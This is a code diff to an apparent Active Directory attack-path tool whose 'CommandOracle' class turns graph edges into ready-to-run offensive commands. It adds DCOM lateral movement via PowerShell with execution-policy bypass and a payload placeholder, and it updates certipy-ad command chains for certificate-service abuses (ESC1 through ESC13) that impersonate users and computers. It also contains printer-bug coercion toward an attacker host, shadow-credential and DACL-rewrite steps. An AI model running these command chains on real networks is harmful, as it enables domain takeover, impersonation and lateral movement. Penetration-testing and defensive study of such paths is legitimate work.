@@ -13,6 +13,7 @@ if TYPE_CHECKING:
 
 EDGE_TOOL_MAP: dict[str, str] = {
     "DCSync": "impacket-secretsdump",
+    "ExecuteDCOM": "powershell",
     "GenericAll": "impacket-getST",
     "WriteDacl": "impacket-dacledit",
     "WriteOwner": "impacket-owneredit",
@@ -166,19 +167,41 @@ class CommandOracle:
                 f"# Target domain: {target_domain}"
             )
 
+        if normalized_edge == "EnterpriseCAFor":
+            target_ca = target.name or "<TARGET_ROOT_OR_AIA_CA>"
+            return (
+                "# EnterpriseCAFor: PKI hierarchy relationship only; it is not independently abusable\n"
+                "# This Enterprise CA chains to the target CA and can contribute to ADCS attack paths such as ESC1/3/6/13 when combined with enrollment and NTAuth relationships\n"
+                f"# Enterprise CA chain target: {target_ca}\n"
+                "# Enumerate the CA chain and related published templates before selecting an ADCS abuse path"
+            )
+
+        if normalized_edge == "ExecuteDCOM":
+            target_host = target.name or "<TARGET_COMPUTER>"
+            return (
+                "# ExecuteDCOM: remote code execution via DCOM on the target host\n"
+                f"# Target host: {target_host}\n"
+                "# Invoke-DCOM provides ready-made lateral movement over several COM objects\n"
+                f"powershell -ep bypass -c \"Import-Module .\\Invoke-DCOM.ps1; Invoke-DCOM -ComputerName {target_host} -Method MMC20.Application -Command '<PAYLOAD_COMMAND>'\"\n"
+                "# Manual COM instantiation by CLSID\n"
+                f"powershell -c \"$ComputerName='{target_host}'; $clsid='{{fbae34e8-bf95-4da8-bf98-6c6e580aa348}}'; $Type=[Type]::GetTypeFromCLSID($clsid,$ComputerName); $ComObject=[Activator]::CreateInstance($Type)\"\n"
+                "# Manual COM instantiation by ProgID\n"
+                f"powershell -c \"$ComputerName='{target_host}'; $ProgId='MMC20.Application'; $Type=[Type]::GetTypeFromProgID($ProgId,$ComputerName); $ComObject=[Activator]::CreateInstance($Type)\""
+            )
+
         if normalized_edge == "DelegatedEnrollmentAgent":
             template = target.name or "<ON_BEHALF_TEMPLATE>"
             return (
                 "# DelegatedEnrollmentAgent: enrollment-agent delegation relationship (not sufficient by itself)\n"
                 "# ESC3 requires this relationship plus a compatible Enrollment Agent cert/template path\n"
                 "# 1) Enroll Enrollment Agent certificate\n"
-                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> "
+                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> "
                 "-template <ENROLLMENT_AGENT_TEMPLATE>\n"
                 "# 2) Request cert on behalf of another principal using delegated template\n"
-                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> "
+                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> "
                 f"-template {template} -on-behalf-of <TARGET_USER> -pfx <AGENT_CERT>.pfx\n"
                 "# 3) Authenticate as target principal\n"
-                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
             )
 
         if normalized_edge == "Enroll":
@@ -188,7 +211,7 @@ class CommandOracle:
                     "# Enroll on EnterpriseCA: CA enrollment right is only one requirement for issuance\n"
                     "# You still need enrollment rights on a published certificate template and must satisfy template issuance requirements\n"
                     f"# Target CA: {target_name}\n"
-                    f"certipy req -u {username}@{domain} -p <PASSWORD> -ca {target_name} "
+                    f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca {target_name} "
                     "-target <CA-SERVER> -template <PUBLISHED_TEMPLATE>\n"
                     f"Certify.exe request --ca {target_name} --template <PUBLISHED_TEMPLATE>"
                 )
@@ -197,7 +220,7 @@ class CommandOracle:
             return (
                 "# Enroll: request a certificate from a published template\n"
                 "# Requirements: the template must be published on an Enterprise CA, you must also have Enroll on that CA, and you must satisfy issuance/SAN constraints\n"
-                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {template}\n"
+                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {template}\n"
                 f"Certify.exe request --ca <CA-SERVER>\\<CA-NAME> --template {template}"
             )
 
@@ -219,11 +242,22 @@ class CommandOracle:
                 "# EnrollOnBehalfOf: ESC3-style template-to-template relationship, not sufficient by itself\n"
                 "# You still need a principal that can enroll the source Enrollment Agent template and a CA path that permits on-behalf-of enrollment\n"
                 "# 1) Enroll an Enrollment Agent certificate from the source template\n"
-                f"certipy req -u {operator_user}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {source_template}\n"
+                f"certipy-ad req -u {operator_user}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {source_template}\n"
                 "# 2) Use that agent certificate to request a cert from the target template on behalf of another principal\n"
-                f"certipy req -u {operator_user}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {target_template} -on-behalf-of <DOMAIN>\\<TARGET_USER> -pfx <AGENT_CERT>.pfx\n"
+                f"certipy-ad req -u {operator_user}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {target_template} -on-behalf-of <DOMAIN>\\<TARGET_USER> -pfx <AGENT_CERT>.pfx\n"
                 "# 3) Authenticate with the issued certificate as the impersonated principal\n"
-                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+            )
+
+        if normalized_edge == "ExtendedByPolicy":
+            source_template = source.name or "<CERT_TEMPLATE>"
+            target_policy = target.name or "<ISSUANCE_POLICY>"
+            return (
+                "# ExtendedByPolicy: the certificate template includes the issuance policy as a certificate extension\n"
+                "# This relationship alone is not abusable, but it is one prerequisite for ESC13 when paired with OIDGroupLink and a valid CA chain\n"
+                f"# Template: {source_template}\n"
+                f"# Issuance policy: {target_policy}\n"
+                "# Follow ESC13 validation: Enroll -> PublishedTo -> EnterpriseCA -> TrustedForNTAuth/chain -> ExtendedByPolicy -> OIDGroupLink"
             )
 
         if normalized_edge == "DumpSMSAPassword":
@@ -371,7 +405,7 @@ class CommandOracle:
                 "# Trigger coercion from target (example)\n"
                 f"SpoolSample.exe {target_host} <ATTACKER_NETBIOS>@<PORT>/file.txt\n"
                 "# Then use issued certificate for auth\n"
-                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
             )
 
         if normalized_edge == "CoerceAndRelayNTLMToLDAP":
@@ -465,7 +499,7 @@ class CommandOracle:
                 f"pywhisker -d {domain} -u {username}{auth_part} "
                 f"--target '{target_principal}' --action add\n"
                 "# Then request TGT as target with PKINIT\n"
-                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
             )
 
         # AllExtendedRights
@@ -503,7 +537,7 @@ class CommandOracle:
                 target_template = target.name or "<TEMPLATE>"
                 return (
                     "# AllExtendedRights on CertTemplate grants enrollment rights (if CA publish/issuance prereqs are met)\n"
-                    f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                    f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                     f"-target <CA-SERVER> -template {target_template}"
                 )
 
@@ -616,10 +650,10 @@ class CommandOracle:
         if normalized_edge == "ADCSESC1":
             return (
                 "# ADCS ESC1: enroll auth-capable cert with arbitrary SAN/UPN\n"
-                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                 f"-target <CA-SERVER> -template <VULN_TEMPLATE> -upn <TARGET_USER>@{domain}\n"
                 "# Use issued certificate to authenticate as target\n"
-                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
             )
 
         # ADCS ESC3
@@ -627,14 +661,14 @@ class CommandOracle:
             return (
                 "# ADCS ESC3: abuse Enrollment Agent to request cert on behalf of another principal\n"
                 "# 1) Enroll Enrollment Agent cert\n"
-                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                 "-target <CA-SERVER> -template <ENROLLMENT_AGENT_TEMPLATE>\n"
                 "# 2) Request on-behalf-of cert for target principal\n"
-                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                 "-target <CA-SERVER> -template <AUTH_TEMPLATE> -on-behalf-of <TARGET_USER> "
                 "-pfx <AGENT_CERT>.pfx\n"
                 "# 3) Authenticate as target\n"
-                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
             )
 
         # ADCS ESC4
@@ -644,34 +678,34 @@ class CommandOracle:
                 "# Grant template control (if needed)\n"
                 "impacket-dacledit -action write -rights FullControl -principal <ATTACKER> "
                 "-target-dn '<CERT_TEMPLATE_DN>' <DOMAIN>/<USER>:<PASS>\n"
-                "# Reconfigure template (Linux certipy shortcut)\n"
-                f"certipy template -username {username}@{domain} -password <PASSWORD> "
+                "# Reconfigure template (Linux certipy-ad shortcut)\n"
+                f"certipy-ad template -username {username}@{domain} -password <PASSWORD> "
                 "-template <TEMPLATE_CN> -save-old\n"
                 "# Then execute ESC1 using the now-vulnerable template\n"
-                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                 "-target <CA-SERVER> -template <TEMPLATE_CN> -upn <TARGET_USER>@<DOMAIN>\n"
-                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
             )
 
         # ADCS ESC6a
         if normalized_edge in ("ADCSESC6a", "ADCSESC6A"):
             return (
                 "# ADCS ESC6a: CA EDITF_ATTRIBUTESUBJECTALTNAME2 allows arbitrary SAN impersonation\n"
-                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                 "-target <CA-SERVER> -template <PUBLISHED_TEMPLATE> -upn <TARGET_USER>@<DOMAIN>\n"
                 "# If strong mapping is enforced, include SID URL (commonly via Certify on Windows)\n"
                 "# Certify.exe request --ca <CA> --template <TEMPLATE> --upn <TARGET> --sid-url <TARGET_SID>\n"
-                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
             )
 
         # ADCS ESC6b
         if normalized_edge in ("ADCSESC6b", "ADCSESC6B"):
             return (
                 "# ADCS ESC6b: CA allows arbitrary SAN and target DC allows weak mapping\n"
-                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                 "-target <CA-SERVER> -template <PUBLISHED_TEMPLATE> -upn <TARGET_USER>@<DOMAIN>\n"
                 "# Authenticate as target with weak cert mapping on affected DC\n"
-                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
             )
 
         # ADCS ESC9a
@@ -679,15 +713,15 @@ class CommandOracle:
             victim = source.name or "<VICTIM_PRINCIPAL>"
             return (
                 "# ADCS ESC9a: weak mapping + no security extension + controlled victim UPN\n"
-                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
+                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> "
                 f"-user {victim} -upn <TARGET_SAMACCOUNTNAME>\n"
                 "# Enroll cert as victim\n"
-                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
+                f"certipy-ad req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
                 "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
                 "# Restore victim UPN and authenticate as target on weak-mapping DC\n"
-                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
+                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> "
                 f"-user {victim} -upn <ORIGINAL_UPN>\n"
-                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
             )
 
         # ADCS ESC9b
@@ -696,13 +730,13 @@ class CommandOracle:
             return (
                 "# ADCS ESC9b: weak mapping + no security extension + controlled victim dNSHostName\n"
                 "# 1) Remove conflicting SPNs for victim if needed\n"
-                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
+                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> "
                 f"-user {victim} -dns <TARGET_HOST>.{domain}\n"
                 "# 2) Enroll cert as victim computer\n"
-                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
+                f"certipy-ad req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
                 "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
                 "# 3) (Optional) restore victim dNSHostName/SPN, then authenticate as target computer\n"
-                "certipy auth -pfx <TARGET_HOST>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <TARGET_HOST>.pfx -dc-ip <DC_IP>"
             )
 
         # ADCS ESC10a
@@ -710,14 +744,14 @@ class CommandOracle:
             victim = source.name or "<VICTIM_PRINCIPAL>"
             return (
                 "# ADCS ESC10a: UPN mapping abuse via controlled victim principal\n"
-                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
+                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> "
                 f"-user {victim} -upn <TARGET_SAM>@{domain}\n"
                 "# Enroll certificate as victim on affected template/CA\n"
-                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
+                f"certipy-ad req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
                 "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
                 "# Restore victim UPN and authenticate with issued cert\n"
-                f"certipy account update -u {username}@{domain} -p <PASSWORD> -user {victim} -upn <ORIGINAL_UPN>\n"
-                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP> -ldap-shell"
+                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> -user {victim} -upn <ORIGINAL_UPN>\n"
+                "certipy-ad auth -pfx <TARGET>.pfx -dc-ip <DC_IP> -ldap-shell"
             )
 
         # ADCS ESC10b
@@ -727,23 +761,23 @@ class CommandOracle:
                 "# ADCS ESC10b: dNSHostName mapping abuse via controlled computer\n"
                 "# 1) Remove conflicting SPNs on victim if needed\n"
                 "# 2) Set victim dNSHostName to target computer FQDN\n"
-                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
+                f"certipy-ad account update -u {username}@{domain} -p <PASSWORD> "
                 f"-user {victim} -dns <TARGET_HOST>.{domain}\n"
                 "# 3) Enroll cert as victim computer\n"
-                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
+                f"certipy-ad req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
                 "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
                 "# 4) Authenticate as mapped target computer\n"
-                "certipy auth -pfx <TARGET_HOST>.pfx -dc-ip <DC_IP> -ldap-shell"
+                "certipy-ad auth -pfx <TARGET_HOST>.pfx -dc-ip <DC_IP> -ldap-shell"
             )
 
         # ADCS ESC13
         if normalized_edge == "ADCSESC13":
             return (
                 "# ADCS ESC13: enroll via template with issuance policy OID->group link\n"
-                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                f"certipy-ad req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                 "-target <CA-SERVER> -template <ESC13_TEMPLATE>\n"
                 "# Use issued certificate to obtain TGT / authenticate with group-derived privileges\n"
-                "certipy auth -pfx <USER>.pfx -dc-ip <DC_IP>"
+                "certipy-ad auth -pfx <USER>.pfx -dc-ip <DC_IP>"
             )
 
         tool = EDGE_TOOL_MAP.get(normalized_edge, "manual")
